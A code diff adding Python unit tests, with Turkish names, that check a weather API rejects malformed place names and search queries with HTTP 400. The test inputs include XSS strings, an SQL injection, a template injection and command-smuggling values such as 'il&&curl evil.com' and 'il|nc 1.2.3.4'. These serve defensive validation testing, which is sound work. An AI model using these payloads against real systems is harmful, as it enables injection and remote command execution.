@@ -911,5 +911,93 @@ class TestWebhookSSRF(unittest.TestCase):
         self.assertEqual(headers["X-MGM-Alert-Id"], "alert-id")
 
 
+class TestKonumVeAramaDogrulama(unittest.TestCase):
+    """il/ilçe (path+query) ve serbest metin arama (q) parametreleri
+    için Pydantic v2 katmanındaki sıkı regex/length doğrulaması.
+    XSS/enjeksiyon karakteri içeren ya da aralık dışı girdiler 400 ile
+    reddedilmeli, geçerli Türkçe yer adları etkilenmemeli."""
+
+    def setUp(self):
+        self.client = app_module.app.test_client()
+        self.original_mgm = app_module.mgm
+        app_module.mgm = FakeMGM()
+        # Tüm test paketi aynı process/IP üzerinden çok sayıda istek
+        # attığı için global rate limit bucket'ı dolabilir
+        app_module.RATE_LIMIT_BUCKETS.clear()
+
+    def tearDown(self):
+        app_module.mgm = self.original_mgm
+        app_module.RATE_LIMIT_BUCKETS.clear()
+
+    def test_gecerli_il_ve_ilce_kabul_edilir(self):
+        resp = self.client.get("/hava-durumu/İstanbul?ilce=Kadıköy")
+        self.assertEqual(resp.status_code, 200)
+        self.assertTrue(resp.get_json()["basarili"])
+
+    def test_tire_ve_kesme_isaretli_yer_adi_kabul_edilir(self):
+        # "Afşin-Elbistan" gibi tireli, gerçek il adı değil ama desen
+        # düzeyinde geçerli olmalı
+        resp = self.client.get("/guncel/Afşin-Elbistan")
+        self.assertEqual(resp.status_code, 200)
+
+    def test_script_etiketi_iceren_il_400_doner(self):
+        resp = self.client.get("/hava-durumu/<img src=x onerror=alert(1)>")
+        self.assertEqual(resp.status_code, 400)
+        data = resp.get_json()
+        self.assertFalse(data["basarili"])
+
+    def test_script_etiketi_iceren_ilce_400_doner(self):
+        resp = self.client.get("/hava-durumu/İstanbul?ilce=<script>alert(1)</script>")
+        self.assertEqual(resp.status_code, 400)
+
+    def test_sql_enjeksiyon_benzeri_il_400_doner(self):
+        resp = self.client.get("/guncel/İstanbul'; DROP TABLE users;--")
+        self.assertEqual(resp.status_code, 400)
+
+    def test_noktalama_agirlikli_il_400_doner(self):
+        for kotu_deger in ["`whoami`", "{{7*7}}", "il&&curl evil.com", "il|nc 1.2.3.4"]:
+            with self.subTest(deger=kotu_deger):
+                resp = self.client.get(f"/guncel/{kotu_deger}")
+                self.assertEqual(resp.status_code, 400)
+
+    def test_80_karakteri_asan_il_400_doner(self):
+        resp = self.client.get("/guncel/" + "a" * 81)
+        self.assertEqual(resp.status_code, 400)
+
+    def test_uyarilar_opsiyonel_il_gecersizse_400_doner(self):
+        resp = self.client.get("/uyarilar?il=<script>")
+        self.assertEqual(resp.status_code, 400)
+
+    def test_uyarilar_il_verilmezse_dogrulama_atlanir(self):
+        resp = self.client.get("/uyarilar")
+        self.assertEqual(resp.status_code, 200)
+
+    def test_ara_gecerli_sorgu_kabul_edilir(self):
+        resp = self.client.get("/ara?q=kadikoy, istanbul")
+        self.assertEqual(resp.status_code, 200)
+
+    def test_ara_script_sorgusu_400_doner(self):
+        resp = self.client.get("/ara?q=<script>alert(1)</script>")
+        self.assertEqual(resp.status_code, 400)
+        data = resp.get_json()
+        self.assertFalse(data["basarili"])
+
+    def test_ara_150_karakteri_asan_sorgu_400_doner(self):
+        resp = self.client.get("/ara?q=" + "a" * 151)
+        self.assertEqual(resp.status_code, 400)
+
+    def test_toplu_sorguda_script_etiketi_400_doner(self):
+        resp = self.client.post(
+            "/toplu", json={"sorgular": ["istanbul", "<script>alert(1)</script>"]}
+        )
+        self.assertEqual(resp.status_code, 400)
+
+    def test_favori_govdesinde_script_etiketi_400_doner(self):
+        resp = self.client.post(
+            "/favoriler", json={"sorgu": "<img src=x onerror=alert(1)>"}
+        )
+        self.assertEqual(resp.status_code, 400)
+
+
 if __name__ == "__main__":
     unittest.main()
